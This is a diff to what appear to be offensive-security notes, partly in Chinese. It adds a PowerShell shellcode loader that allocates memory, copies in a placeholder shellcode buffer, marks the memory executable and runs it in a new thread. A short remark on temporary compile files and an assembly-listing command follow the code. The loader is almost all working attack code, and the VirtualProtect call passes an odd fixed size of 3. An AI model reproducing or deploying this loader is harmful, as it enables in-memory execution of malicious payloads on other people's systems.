@@ -46,5 +46,19 @@ PAGE_GUARD = 0x100
 PAGE_NOCACHE = 0x200
 PAGE_WRITECOMBINE = 0x400
 }
+
+[Byte[]] $buf = {shellcode}
+
+$oldflag = [UInt32]0
+$size = $buf.Length
+
+[IntPtr]$addr = [Win32]::VirtualAlloc(0,$size,0x3000,[PageProtection]::PAGE_READWRITE.value__);
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
+[Win32]::VirtualProtect($addr,[UInt32]3,[PageProtection]::PAGE_EXECUTE_READ.value__,[ref]$oldflag);
+$thandle=[Win32]::CreateThread(0,0,$addr,0,0,0);
+[Win32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF");
 ```
+- Porting Shellcode 的方式會暫時產生編譯暫存檔
+- `[appdomain]::currentdomain.getassemblies() | Sort-Object -Property fullname | Format-Table fullname`
+- ![image](https://user-images.githubusercontent.com/81568292/137419725-60cbc852-9ae3-4138-b457-35f6aa2760ab.png)
 
